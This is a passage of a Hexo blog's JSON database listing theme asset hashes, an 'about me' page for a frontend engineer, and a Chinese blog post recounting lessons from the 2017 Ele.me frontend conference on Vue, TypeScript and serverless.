e73fb3239466916577","modified":1633671371196},{"_id":"source/_posts/the-skills-of-develop/discuss.png","hash":"fcff8c77df428f818d28ae6620c190e6a0242e20","modified":1629769791299},{"_id":"source/_posts/the-skills-of-develop/gantt-chart.png","hash":"503e22c96b9f18ee44e036161d88298c83a5344a","modified":1629769791300},{"_id":"themes/next/source/lib/jquery/index.js","hash":"41b4bfbaa96be6d1440db6e78004ade1c134e276","modified":1631334350457},{"_id":"themes/next/source/js/src/motion.js","hash":"754b294394f102c8fd9423a1789ddb1201677898","modified":1631334350444},{"_id":"source/_posts/basic-cookies/font-transfer-cookie.png","hash":"93e8b145b7991848565ab86a47a860aab8fe70ba","modified":1629769791292},{"_id":"source/_posts/basic-cookies/unlogin-cookie.png","hash":"cd0373115abf9268a10f8137dae626ae9029d07a","modified":1629769791296},{"_id":"source/_posts/git-rebase-merge-commit/modified-git-log.png","hash":"c555007eb96bc59d95c5e0d4d54dac3a8cc996bd","modified":1633671439841},{"_id":"themes/next/.git/logs/refs/heads/master","hash":"cbd0aba455336a85bc159a17137d041b26620efb","modified":1631334350424},{"_id":"themes/next/.git/refs/remotes/origin/HEAD","hash":"d9427cda09aba1cdde5c69c2b13c905bddb0bc51","modified":1631334350420},{"_id":"themes/next/source/css/_common/outline/outline.styl","hash":"2186be20e317505cd31886f1291429cc21f76703","modified":1631334350439},{"_id":"themes/next/source/css/_common/scaffolding/base.styl","hash":"f7c44b0ee46cf2cf82a4c9455ba8d8b55299976f","modified":1631334350439},{"_id":"themes/next/source/css/_common/scaffolding/helpers.styl","hash":"9c25c75311e1bd4d68df031d3f2ae6d141a90766","modified":1631334350439},{"_id":"themes/next/source/css/_common/scaffolding/mobile.styl","hash":"47a46583a1f3731157a3f53f80ed1ed5e2753e8e","modified":1631334350439},{"_id":"themes/next/source/css/_common/scaffolding/scaffolding.styl","hash":"a280a583b7615e939aaddbf778f5c108ef8a2a6c","modified":1631334350439},{"_id":"themes/next/source/css/_common/scaffolding/normalize.styl","hash":"ece571f38180febaf02ace8187ead8318a300ea7","modified":1631334350439},{"_id":"themes/next/source/css/_common/scaffolding/tables.styl","hash":"64f5d56c08d74a338813df1265580ca0cbf0190b","modified":1631334350439},{"_id":"themes/next/source/css/_common/components/back-to-top-sidebar.styl","hash":"4719ce717962663c5c33ef97b1119a0b3a4ecdc3","modified":1631334350435},{"_id":"themes/next/source/css/_common/components/buttons.styl","hash":"7e509c7c28c59f905b847304dd3d14d94b6f3b8e","modified":1631334350435},{"_id":"themes/next/source/css/_common/components/comments.styl","hash":"471f1627891aca5c0e1973e09fbcb01e1510d193","modified":1631334350435},{"_id":"themes/next/source/css/_common/components/components.styl","hash":"a6bb5256be6195e76addbda12f4ed7c662d65e7a","modified":1631334350435},{"_id":"themes/next/source/css/_common/components/back-to-top.styl","hash":"31050fc7a25784805b4843550151c93bfa55c9c8","modified":1631334350435},{"_id":"themes/next/source/css/_common/components/pagination.styl","hash":"c5d48863f332ff8ce7c88dec2c893f709d7331d3","modified":1631334350436},{"_id":"themes/next/source/css/_common/components/tag-cloud.styl","hash":"dd8a3b22fc2f222ac6e6c05bd8a773fb039169c0","modified":1631334350437},{"_id":"themes/next/source/css/_schemes/Gemini/index.styl","hash":"18c3336ee3d09bd2da6a876e1336539f03d5a973","modified":1631334350440},{"_id":"themes/next/source/css/_schemes/Mist/_base.styl","hash":"c2d079788d6fc2e9a191ccdae94e50d55bf849dc","modified":1631334350440},{"_id":"themes/next/source/css/_schemes/Mist/_header.styl","hash":"5ae7906dc7c1d9468c7f4b4a6feddddc555797a1","modified":1631334350440},{"_id":"themes/next/source/css/_schemes/Mist/_logo.styl","hash":"38e5df90c8689a71c978fd83ba74af3d4e4e5386","modified":1631334350440},{"_id":"themes/next/source/css/_schemes/Mist/_menu.styl","hash":"b0dcca862cd0cc6e732e33d975b476d744911742","modified":1631334350440},{"_id":"themes/next/source/css/_schemes/Mist/_posts-expanded.styl","hash":"3b25edfa187d1bbbd0d38b50dd013cef54758abf","modified":1631334350440},{"_id":"themes/next/source/css/_schemes/Mist/_search.styl","hash":"1452cbe674cc1d008e1e9640eb4283841058fc64","modified":1631334350440},{"_id":"themes/next/source/css/_schemes/Muse/_layout.styl","hash":"0efa036a15c18f5abb058b7c0fad1dd9ac5eed4c","modified":1631334350441},{"_id":"themes/next/source/css/_schemes/Muse/_logo.styl","hash":"8829bc556ca38bfec4add4f15a2f028092ac6d46","modified":1631334350441},{"_id":"themes/next/source/css/_schemes/Mist/index.styl","hash":"9a5581a770af8964064fef7afd3e16963e45547f","modified":1631334350441},{"_id":"themes/next/source/css/_schemes/Muse/_menu.styl","hash":"4aac01962520d60b03b23022ab601ad4bd19c08c","modified":1631334350441},{"_id":"themes/next/source/css/_schemes/Pisces/_brand.styl","hash":"c4ed249798296f60bda02351fe6404fb3ef2126f","modified":1631334350441},{"_id":"themes/next/source/css/_schemes/Muse/_search.styl","hash":"1452cbe674cc1d008e1e9640eb4283841058fc64","modified":1631334350441},{"_id":"themes/next/source/css/_schemes/Pisces/_layout.styl","hash":"5b93958239d3d2bf9aeaede44eced2434d784462","modified":1631334350441},{"_id":"themes/next/source/css/_schemes/Muse/index.styl","hash":"a0e2030a606c934fb2c5c7373aaae04a1caac4c5","modified":1631334350441},{"_id":"themes/next/source/css/_schemes/Pisces/_posts.styl","hash":"2f878213cb24c5ddc18877f6d15ec5c5f57745ac","modified":1631334350442},{"_id":"themes/next/source/css/_schemes/Pisces/index.styl","hash":"69ecd6c97e7cdfd822ac8102b45ad0ede85050db","modified":1631334350442},{"_id":"themes/next/source/css/_schemes/Pisces/_menu.styl","hash":"215de948be49bcf14f06d500cef9f7035e406a43","modified":1631334350442},{"_id":"themes/next/source/css/_schemes/Pisces/_sidebar.styl","hash":"9d16fa3c14ed76b71229f022b63a02fd0f580958","modified":1631334350442},{"_id":"themes/next/source/lib/Han/dist/han.min.js","hash":"f559c68a25065a14f47da954a7617d87263e409d","modified":1631334350446},{"_id":"themes/next/source/lib/fancybox/source/blank.gif","hash":"2daeaa8b5f19f0bc209d976c02bd6acb51b00b0a","modified":1631334350448},{"_id":"themes/next/source/lib/fancybox/source/fancybox_loading.gif","hash":"1a755fb2599f3a313cc6cfdb14df043f8c14a99c","modified":1631334350448},{"_id":"themes/next/source/lib/fancybox/source/fancybox_overlay.png","hash":"b3a4ee645ba494f52840ef8412015ba0f465dbe0","modified":1631334350448},{"_id":"themes/next/source/lib/fancybox/source/fancybox_loading@2x.gif","hash":"273b123496a42ba45c3416adb027cd99745058b0","modified":1631334350448},{"_id":"themes/next/source/lib/fancybox/source/fancybox_sprite.png","hash":"17df19f97628e77be09c352bf27425faea248251","modified":1631334350448},{"_id":"themes/next/source/lib/fancybox/source/fancybox_sprite@2x.png","hash":"30c58913f327e28f466a00f4c1ac8001b560aed8","modified":1631334350448},{"_id":"themes/next/source/lib/fancybox/source/jquery.fancybox.css","hash":"5f163444617b6cf267342f06ac166a237bb62df9","modified":1631334350448},{"_id":"themes/next/source/lib/fancybox/source/jquery.fancybox.pack.js","hash":"53360764b429c212f424399384417ccc233bb3be","modified":1631334350449},{"_id":"themes/next/source/lib/fancybox/source/jquery.fancybox.js","hash":"1cf3d47b5ccb7cb6e9019c64f2a88d03a64853e4","modified":1631334350449},{"_id":"themes/next/source/lib/fastclick/lib/fastclick.min.js","hash":"2cae0f5a6c5d6f3cb993015e6863f9483fc4de18","modified":1631334350449},{"_id":"themes/next/source/lib/font-awesome/css/font-awesome.css","hash":"0140952c64e3f2b74ef64e050f2fe86eab6624c8","modified":1631334350450},{"_id":"themes/next/source/js/src/schemes/pisces.js","hash":"8050a5b2683d1d77238c5762b6bd89c543daed6e","modified":1631334350444},{"_id":"themes/next/source/lib/ua-parser-js/dist/ua-parser.pack.js","hash":"214dad442a92d36af77ed0ca1d9092b16687f02f","modified":1631334350461},{"_id":"themes/next/source/lib/ua-parser-js/dist/ua-parser.min.js","hash":"38628e75e4412cc6f11074e03e1c6d257aae495b","modified":1631334350461},{"_id":"themes/next/layout/_third-party/search/algolia-search/assets.swig","hash":"28ff4ed6714c59124569ffcbd10f1173d53ca923","modified":1631334350433},{"_id":"themes/next/layout/_third-party/search/algolia-search/dom.swig","hash":"ba698f49dd3a868c95b240d802f5b1b24ff287e4","modified":1631334350433},{"_id":"source/_posts/git-rebase-merge-commit/git-log.png","hash":"34fc6e472520305b9aa48cbed6285db40e8edc82","modified":1633669960700},{"_id":"themes/next/source/lib/Han/dist/han.css","hash":"bd40da3fba8735df5850956814e312bd7b3193d7","modified":1631334350445},{"_id":"themes/next/source/lib/Han/dist/han.min.css","hash":"a0c9e32549a8b8cf327ab9227b037f323cdb60ee","modified":1631334350446},{"_id":"themes/next/source/lib/Han/dist/han.js","hash":"e345397e0585c9fed1449e614ec13e0224acf2ab","modified":1631334350445},{"_id":"themes/next/source/lib/fastclick/lib/fastclick.js","hash":"06cef196733a710e77ad7e386ced6963f092dc55","modified":1631334350449},{"_id":"themes/next/source/lib/font-awesome/css/font-awesome.css.map","hash":"0189d278706509412bac4745f96c83984e1d59f4","modified":1631334350450},{"_id":"themes/next/source/lib/font-awesome/css/font-awesome.min.css","hash":"512c7d79033e3028a9be61b540cf1a6870c896f8","modified":1631334350450},{"_id":"source/_posts/nest-js-tutorial-2/log.png","hash":"3e43dcc59ca18866d263683cbb4dd124e542a6da","modified":1631420439832},{"_id":"themes/next/.git/logs/refs/remotes/origin/HEAD","hash":"cbd0aba455336a85bc159a17137d041b26620efb","modified":1631334350420},{"_id":"themes/next/source/css/_common/components/header/header.styl","hash":"ae1ca14e51de67b07dba8f61ec79ee0e2e344574","modified":1631334350435},{"_id":"themes/next/source/css/_common/components/header/headerband.styl","hash":"d27448f199fc2f9980b601bc22b87f08b5d64dd1","modified":1631334350435},{"_id":"themes/next/source/css/_common/components/header/site-meta.styl","hash":"6c00f6e0978f4d8f9a846a15579963728aaa6a17","modified":1631334350435},{"_id":"themes/next/source/css/_common/components/header/menu.styl","hash":"8a2421cb9005352905fae9d41a847ae56957247e","modified":1631334350435},{"_id":"themes/next/source/css/_common/components/header/site-nav.styl","hash":"49c2b2c14a1e7fcc810c6be4b632975d0204c281","modified":1631334350435},{"_id":"themes/next/source/css/_common/components/footer/footer.styl","hash":"7905a7f625702b45645d8be1268cb8af3f698c70","modified":1631334350435},{"_id":"themes/next/source/css/_common/components/highlight/diff.styl","hash":"96f32ea6c3265a3889e6abe57587f6e2a2a40dfb","modified":1631334350435},{"_id":"themes/next/source/css/_common/components/highlight/theme.styl","hash":"b76387934fb6bb75212b23c1a194486892cc495e","modified":1631334350435},{"_id":"themes/next/source/css/_common/components/pages/archive.styl","hash":"f5aa2ba3bfffc15475e7e72a55b5c9d18609fdf5","modified":1631334350436},{"_id":"themes/next/source/css/_common/components/pages/categories.styl","hash":"4eff5b252d7b614e500fc7d52c97ce325e57d3ab","modified":1631334350436},{"_id":"themes/next/source/css/_common/components/highlight/highlight.styl","hash":"25dc25f61a232f03ca72472b7852f882448ec185","modified":1631334350435},{"_id":"themes/next/source/css/_common/components/pages/pages.styl","hash":"2039590632bba3943c39319d80ef630af7928185","modified":1631334350436},{"_id":"themes/next/source/css/_common/components/pages/post-detail.styl","hash":"9bf4362a4d0ae151ada84b219d39fbe5bb8c790e","modified":1631334350436},{"_id":"themes/next/source/css/_common/components/pages/schedule.styl","hash":"a82afbb72d83ee394aedc7b37ac0008a9823b4f4","modified":1631334350436},{"_id":"themes/next/source/css/_common/components/post/post-button.styl","hash":"e72a89e0f421444453e149ba32c77a64bd8e44e8","modified":1631334350436},{"_id":"themes/next/source/css/_common/components/post/post-collapse.styl","hash":"0f7f522cc6bfb3401d5afd62b0fcdf48bb2d604b","modified":1631334350436},{"_id":"themes/next/source/css/_common/components/post/post-copyright.styl","hash":"f54367c0feda6986c030cc4d15a0ca6ceea14bcb","modified":1631334350436},{"_id":"themes/next/source/css/_common/components/post/post-eof.styl","hash":"2cdc094ecf907a02fce25ad4a607cd5c40da0f2b","modified":1631334350436},{"_id":"themes/next/source/css/_common/components/post/post-gallery.styl","hash":"387ce23bba52b22a586b2dfb4ec618fe1ffd3926","modified":1631334350436},{"_id":"themes/next/source/css/_common/components/post/post-meta.styl","hash":"aea21141015ca8c409d8b33e3e34ec505f464e93","modified":1631334350436},{"_id":"themes/next/source/css/_common/components/post/post-nav.styl","hash":"a5d8617a24d7cb6c5ad91ea621183ca2c0917331","modified":1631334350436},{"_id":"themes/next/source/css/_common/components/post/post-tags.styl","hash":"a352ae5b1f8857393bf770d2e638bf15f0c9585d","modified":1631334350437},{"_id":"themes/next/source/css/_common/components/post/post-reward.styl","hash":"36332c8a91f089f545f3c3e8ea90d08aa4d6e60c","modified":1631334350436},{"_id":"themes/next/source/css/_common/components/post/post-rtl.styl","hash":"017074ef58166e2d69c53bb7590a0e7a8947a1ed","modified":1631334350436},{"_id":"themes/next/source/css/_common/components/post/post-expand.styl","hash":"535b3b4f8cb1eec2558e094320e7dfb01f94c0e7","modified":1631334350436},{"_id":"themes/next/source/css/_common/components/post/post-type.styl","hash":"10251257aceecb117233c9554dcf8ecfef8e2104","modified":1631334350437},{"_id":"themes/next/source/css/_common/components/post/post-title.styl","hash":"d5a4e4fc17f1f7e7c3a61b52d8e2e9677e139de7","modified":1631334350437},{"_id":"themes/next/source/css/_common/components/post/post-widgets.styl","hash":"e4055a0d2cd2b0ad9dc55928e2f3e7bd4e499da3","modified":1631334350437},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar-author-links.styl","hash":"0a6c0efffdf18bddbc1d1238feaed282b09cd0fe","modified":1631334350437},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar-author.styl","hash":"920343e41c124221a17f050bbb989494d44f7a24","modified":1631334350437},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar-blogroll.styl","hash":"89dd4f8b1f1cce3ad46cf2256038472712387d02","modified":1631334350437},{"_id":"themes/next/source/css/_common/components/post/post.styl","hash":"262debfd4442fa03d9919ceb88b948339df03fb0","modified":1631334350437},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar-dimmer.styl","hash":"efa5e5022e205b52786ce495d4879f5e7b8f84b2","modified":1631334350437},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar-nav.styl","hash":"45fa7193435a8eae9960267438750b4c9fa9587f","modified":1631334350437},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar-feed-link.styl","hash":"9486ddd2cb255227db102d09a7df4cae0fabad72","modified":1631334350437},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar.styl","hash":"50305b6ad7d09d2ffa4854e39f41ec1f4fe984fd","modified":1631334350437},{"_id":"themes/next/source/css/_common/components/sidebar/site-state.styl","hash":"3623e7fa4324ec1307370f33d8f287a9e20a5578","modified":1631334350437},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar-toc.styl","hash":"12937cae17c96c74d5c58db6cb29de3b2dfa14a2","modified":1631334350437},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar-toggle.styl","hash":"f7784aba0c1cd20d824c918c120012d57a5eaa2a","modified":1631334350437},{"_id":"themes/next/source/css/_common/components/tags/blockquote-center.styl","hash":"c2abe4d87148e23e15d49ee225bc650de60baf46","modified":1631334350437},{"_id":"themes/next/source/css/_common/components/tags/exturl.styl","hash":"1b3cc9f4e5a7f6e05b4100e9990b37b20d4a2005","modified":1631334350438},{"_id":"themes/next/source/css/_common/components/tags/group-pictures.styl","hash":"4851b981020c5cbc354a1af9b831a2dcb3cf9d39","modified":1631334350438},{"_id":"themes/next/source/css/_common/components/tags/full-image.styl","hash":"37e951e734a252fe8a81f452b963df2ba90bfe90","modified":1631334350438},{"_id":"themes/next/source/css/_common/components/tags/note-modern.styl","hash":"ee7528900578ef4753effe05b346381c40de5499","modified":1631334350438},{"_id":"themes/next/source/css/_common/components/tags/tabs.styl","hash":"4ab5deed8c3b0c338212380f678f8382672e1bcb","modified":1631334350438},{"_id":"themes/next/source/css/_common/components/tags/tags.styl","hash":"ead0d0f2321dc71505788c7f689f92257cf14947","modified":1631334350438},{"_id":"themes/next/source/css/_common/components/tags/label.styl","hash":"4a457d265d62f287c63d48764ce45d9bcfc9ec5a","modified":1631334350438},{"_id":"themes/next/source/css/_common/components/third-party/algolia-search.styl","hash":"fd42777b9125fd8969dc39d4f15473e2b91b4142","modified":1631334350438},{"_id":"themes/next/source/css/_common/components/third-party/busuanzi-counter.styl","hash":"d4e6d8d7b34dc69994593c208f875ae8f7e8a3ae","modified":1631334350438},{"_id":"themes/next/source/css/_common/components/third-party/duoshuo.styl","hash":"2340dd9b3202c61d73cc708b790fac5adddbfc7f","modified":1631334350438},{"_id":"themes/next/source/css/_common/components/third-party/baidushare.styl","hash":"93b08815c4d17e2b96fef8530ec1f1064dede6ef","modified":1631334350438},{"_id":"themes/next/source/css/_common/components/third-party/han.styl","hash":"cce6772e2cdb4db85d35486ae4c6c59367fbdd40","modified":1631334350438},{"_id":"themes/next/source/css/_common/components/third-party/jiathis.styl","hash":"327b5f63d55ec26f7663185c1a778440588d9803","modified":1631334350438},{"_id":"themes/next/source/css/_common/components/third-party/localsearch.styl","hash":"d89c4b562b528e4746696b2ad8935764d133bdae","modified":1631334350439},{"_id":"themes/next/source/css/_common/components/third-party/gitment.styl","hash":"34935b40237c074be5f5e8818c14ccfd802b7439","modified":1631334350438},{"_id":"themes/next/source/css/_common/components/third-party/needsharebutton.styl","hash":"a5e3e6b4b4b814a9fe40b34d784fed67d6d977fa","modified":1631334350439},{"_id":"themes/next/source/css/_common/components/third-party/third-party.styl","hash":"1ccfbd4d0f5754b2dc2719a91245c95f547a7652","modified":1631334350439},{"_id":"themes/next/source/css/_schemes/Mist/outline/outline.styl","hash":"5dc4859c66305f871e56cba78f64bfe3bf1b5f01","modified":1631334350441},{"_id":"themes/next/source/css/_schemes/Mist/sidebar/sidebar-blogroll.styl","hash":"817587e46df49e819858c8ecbafa08b53d5ff040","modified":1631334350441},{"_id":"themes/next/source/css/_schemes/Muse/sidebar/sidebar-blogroll.styl","hash":"817587e46df49e819858c8ecbafa08b53d5ff040","modified":1631334350441},{"_id":"themes/next/source/lib/Han/dist/font/han-space.otf","hash":"07436f011b44051f61b8329c99de4bec64e86f4b","modified":1631334350445},{"_id":"themes/next/source/lib/Han/dist/font/han-space.woff","hash":"7a635062b10bf5662ae1d218ba0980171005d060","modified":1631334350445},{"_id":"themes/next/source/lib/Han/dist/font/han.woff","hash":"f38ff9b2eecaa17b50b66aa2dae87e9e7436d195","modified":1631334350445},{"_id":"themes/next/source/lib/Han/dist/font/han.otf","hash":"f1f6bb8f461f5672e000380195d3d2358a28494c","modified":1631334350445},{"_id":"themes/next/source/lib/Han/dist/font/han.woff2","hash":"623af3ed5423371ac136a4fe0e8cc7bb7396037a","modified":1631334350445},{"_id":"themes/next/source/lib/fancybox/source/helpers/fancybox_buttons.png","hash":"e385b139516c6813dcd64b8fc431c364ceafe5f3","modified":1631334350448},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-buttons.css","hash":"1a9d8e5c22b371fcc69d4dbbb823d9c39f04c0c8","modified":1631334350448},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-buttons.js","hash":"91e41741c2e93f732c82aaacec4cfc6e3f3ec876","modified":1631334350448},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-media.js","hash":"3bdf69ed2469e4fb57f5a95f17300eef891ff90d","modified":1631334350448},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-thumbs.css","hash":"4ac329c16a5277592fc12a37cca3d72ca4ec292f","modified":1631334350448},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-thumbs.js","hash":"53e194f4a72e649c04fb586dd57762b8c022800b","modified":1631334350448},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.woff2","hash":"d6f48cba7d076fb6f2fd6ba993a75b9dc1ecbf0c","modified":1631334350457},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.woff","hash":"28b782240b3e76db824e12c02754a9731a167527","modified":1631334350457},{"_id":"themes/next/source/lib/velocity/velocity.js","hash":"9f08181baea0cc0e906703b7e5df9111b9ef3373","modified":1631334350462},{"_id":"themes/next/source/css/_common/components/tags/note.styl","hash":"32c9156bea5bac9e9ad0b4c08ffbca8b3d9aac4b","modified":1631334350438},{"_id":"themes/next/source/lib/font-awesome/fonts/FontAwesome.otf","hash":"048707bc52ac4b6563aaa383bfe8660a0ddc908c","modified":1631334350451},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.eot","hash":"d980c2ce873dc43af460d4d572d441304499f400","modified":1631334350451},{"_id":"source/_posts/git-rebase-merge-commit/git-rebase-s.png","hash":"62ef70934bff3a0a3fe817cd39f554e89d6a8960","modified":1633670342800},{"_id":"themes/next/.git/objects/pack/pack-994003caf4e868238a52cc0b4355cbe4f0b7b9fa.idx","hash":"02b37064661d6969f31773d621df717a9a0a2281","modified":1631334350409},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.ttf","hash":"13b1eab65a983c7a73bc7997c479d66943f7c6cb","modified":1631334350456},{"_id":"source/_posts/basic-cookies/login-cookie.png","hash":"92eab5af4137f7f320effb4e9b4059b0fa338620","modified":1629769791294},{"_id":"themes/next/source/lib/algolia-instant-search/instantsearch.min.js","hash":"9ccc6f8144f54e86df9a3fd33a18368d81cf3a4f","modified":1631334350447},{"_id":"themes/next/source/lib/three/three.min.js","hash":"73f4cdc17e51a72b9bf5b9291f65386d615c483b","modified":1631334350461},{"_id":"source/_posts/git-rebase-merge-commit/git-rebase-pick.png","hash":"f23fdba218eb81ca3d2fc2f3701853fd28c13d57","modified":1633670562407},{"_id":"source/_posts/2017-ele-Interecommunions/eleTalking.jpg","hash":"e7862e16ae19d453558bc31c1ae66de9b5665c31","modified":1629769791287},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.svg","hash":"98a8aa5cf7d62c2eff5f07ede8d844b874ef06ed","modified":1631334350455},{"_id":"themes/next/.git/objects/pack/pack-994003caf4e868238a52cc0b4355cbe4f0b7b9fa.pack","hash":"ebe2eeac984080af3fa05175209b940879c9ec8e","modified":1631334350406}],"Category":[],"Data":[],"Page":[{"title":"about me","date":"2021-09-11T05:32:05.000Z","_content":"工作时间：19年入职\n工作地点：深圳腾讯\n工作岗位：前端工程师\n\nskill: JavaScript, TypesScript, React, Vue, NextJs, Egg, Koa ...\n\n热爱生活，喜欢探索新事物\n","source":"about/index.md","raw":"---\ntitle: about me\ndate: 2021-09-11 13:32:05\n---\n工作时间：19年入职\n工作地点：深圳腾讯\n工作岗位：前端工程师\n\nskill: JavaScript, TypesScript, React, Vue, NextJs, Egg, Koa ...\n\n热爱生活，喜欢探索新事物\n","updated":"2021-09-11T05:39:20.575Z","path":"about/index.html","comments":1,"layout":"page","_id":"ckuq8nyzs00004jzxuevmo2wl","content":"<p>工作时间：19年入职<br>工作地点：深圳腾讯<br>工作岗位：前端工程师</p><p>skill: JavaScript, TypesScript, React, Vue, NextJs, Egg, Koa …</p><p>热爱生活，喜欢探索新事物</p>","site":{"data":{}},"excerpt":"","more":"<p>工作时间：19年入职<br>工作地点：深圳腾讯<br>工作岗位：前端工程师</p><p>skill: JavaScript, TypesScript, React, Vue, NextJs, Egg, Koa …</p><p>热爱生活，喜欢探索新事物</p>"},{"title":"tags","date":"2021-09-11T12:02:23.000Z","type":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2021-09-11 20:02:23\ntype: \"tags\"\n---\n","updated":"2021-09-11T12:03:00.851Z","path":"tags/index.html","comments":1,"layout":"page","_id":"ckuq8nz2100384jzx5dha2pkk","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"2017饿了么前端交流会","date":"2017-11-06T13:07:35.000Z","dir":"随笔","keywords":"2017 饿了么前端交流会","_content":"#### 几个演讲\n从h5的埋雷到ServerLess，确实有很多收获。\n从h5里面，不仅得到了关于页面优化的一些方案，也触及到了一些解决方案。发现h5有很多东西值得深究，有页面调试的一些优化等等。例如：从sticky到z-index实在有太多的学问了。而在工具方面，发现chrome的调试工具是在是太强大了，以前一直没有用过的memery和apperance等等，都有了新的认识。发现页面优化不仅仅是想象的那么简单。从小东西上入手，发现有很多的学问。是在是可以多学。层的探讨、强制同步布局、visibility、￥和&yen,以及dom的一步步呈现。感觉自己学的尚浅，有许多东西可以去学习。\n从第三方服务上也学到许多，vue的地图篇，地图的实现以及地图api的调用以及api的设计，等等。对vue的深度似乎多了那么一些，总感觉自己学的东西都特别浅，没有能直接做的，对这一块还是得加深学习。\n当然还有页面编辑可视化的一些小理解。可以通过直接编译组建，上传到服务器，然后服务器直接加到代码中，就可以不用cv代码，直接到里面去修改了。页面编辑其实就将页面上的东西图片生成一个json，让后到服务器中再呈现。而各个小组件是直接编译也好或者源代码也好，上传到服务器后，服务器上有一个gulp或者webpack，直接将其打包，编译，出现页面。这样就可以直接在本地做小组件，然后上传到服务器，服务器直接将其打包之后，就可以直接生成新的页面了。\n还有用户体验。在用户体验上，发现确实有很多东西需要去深入。比如用户体验的的最终目的，用户体验的原始需求，去发觉里面的各个种种原始目的、需求去解决问题。这样能快速的从用户的角度去看事情的原委。当然，这个产品针对人群也要去探讨，是不是要更改是从目的人群去发掘的。\n再就是vue和typescript。之前一直不愿意去接触typescript，很大的一个原因是因为自己喜欢原生的东西，喜欢纯粹的东西，所以不愿意，或者说去排斥typescript。这次无疑是打开了我对typescript的一扇门，因为typescript确实设计的很好，一些东西确实可以去深究。而typescript和vue也开始慢慢融合了，在vue的2.5版本里面是typescript的一个上升期，vue对typescript的支持，也可以更优雅的写vue了。所以对typescript也没有了之前的排斥，而是对它开始慢慢接受了。\n最后的东西就是serverless，serverless是一个很强的东西，虽然我之前没有了解过，唯一了解是通过这次开发者大会上。但是serverless从前辈的介绍上，他确实可以减少很多运维和后端的一些成本，从而快速开发。现在这个时代就是一个快速开发的时代，所以对serverless的前景，肯定是光明的。所以开始使用serverless是一个不错的选择。\n![ele-taking](eleTalking.jpg)\n#### 心得\n在这次前端开发者大会上，确实有很多收获，从打开一扇新技术的大门，到很多新型技术上的接触。从一些排斥，到一些闪光点的发觉。慢慢发现还有很多事情应该去深究的。当然这是技术上的发觉。还有是在上海这个地方，或者说人生观的觉悟。上海这个地方是一个神奇的地方，他是金融中心，也是很多人的发源地。可以有很多机会让你一夜暴富。但是相同的，他太多的泡沫。很多人都是很疲惫的生活着，没有自己的梦想，在一个大城市的打磨之下，变成了这个大城市运作的一个个小零件。对这件事情之上，有很深的体会。路上的人看起来没有那么慈眉善目，也没有很多的暖，只是冷冷的互相看着手机。可能我是不适合上海这个城市吧。对于这种束缚力过强的地方，不如在小城市来的实在。\n\n#### 感谢\n此次饿了么活动是子健学长和成成学长两个人推荐去的。在去的途中，子健学长和成成学长对我们非常照顾，不仅定房间和吃饭问题，在此次大会上也交流了许多技术，学到了很多。女神也对我们十分照顾，请我们大吃一顿，聊了很久，对于上海这个城市有了新的认识。在此次饿了么之旅发现了许多新技术，以及之前没有涉及到的领域，也从各个大牛手上获取了一手的咨询。不论是对自己，还是对家园，都有了新的认识，新的期许。","source":"_posts/2017-ele-Interecommunions.md","raw":"---\ntitle: 2017饿了么前端交流会\ndate: 2017-11-06 21:07:35\ntags: 随笔\ndir: 随笔\nkeywords: 2017 饿了么前端交流会\n---\n#### 几个演讲\n从h5的埋雷到ServerLess，确实有很多收获。\n从h5里面，不仅得到了关于页面优化的一些方案，也触及到了一些解决方案。发现h5有很多东西值得深究，有页面调试的一些优化等等。例如：从sticky到z-index实在有太多的学问了。而在工具方面，发现chrome的调试工具是在是太强大了，以前一直没有用过的memery和apperance等等，都有了新的认识。发现页面优化不仅仅是想象的那么简单。从小东西上入手，发现有很多的学问。是在是可以多学。层的探讨、强制同步布局、visibility、￥和&yen,以及dom的一步步呈现。感觉自己学的尚浅，有许多东西可以去学习。\n从第三方服务上也学到许多，vue的地图篇，地图的实现以及地图api的调用以及api的设计，等等。对vue的深度似乎多了那么一些，总感觉自己学的东西都特别浅，没有能直接做的，对这一块还是得加深学习。\n当然还有页面编辑可视化的一些小理解。可以通过直接编译组建，上传到服务器，然后服务器直接加到代码中，就可以不用cv代码，直接到里面去修改了。页面编辑其实就将页面上的东西图片生成一个json，让后到服务器中再呈现。而各个小组件是直接编译也好或者源代码也好，上传到服务器后，服务器上有一个gulp或者webpack，直接将其打包，编译，出现页面。这样就可以直接在本地做小组件，然后上传到服务器，服务器直接将其打包之后，就可以直接生成新的页面了。\n还有用户体验。在用户体验上，发现确实有很多东西需要去深入。比如用户体验的的最终目的，用户体验的原始需求，去发觉里面的各个种种原始目的、需求去解决问题。这样能快速的从用户的角度去看事情的原委。当然，这个产品针对人群也要去探讨，是不是要更改是从目的人群去发掘的。\n再就是vue和typescript。之前一直不愿意去接触typescript，很大的一个原因是因为自己喜欢原生的东西，喜欢纯粹的东西，所以不愿意，或者说去排斥typescript。这次无疑是打开了我对typescript的一扇门，因为typescript确实设计的很好，一些东西确实可以去深究。而typescript和vue也开始慢慢融合了，在vue的2.5版本里面是typescript的一个上升期，vue对typescript的支持，也可以更优雅的写vue了。所以对typescript也没有了之前的排斥，而是对它开始慢慢接受了。\n最后的东西就是serverless，serverless是一个很强的东西，虽然我之前没有了解过，唯一了解是通过这次开发者大会上。但是serverless从前辈的介绍上，他确实可以减少很多运维和后端的一些成本，从而快速开发。现在这个时代就是一个快速开发的时代，所以对serverless的前景，肯定是光明的。所以开始使用serverless是一个不错的选择。\n![ele-taking](eleTalking.jpg)\n#### 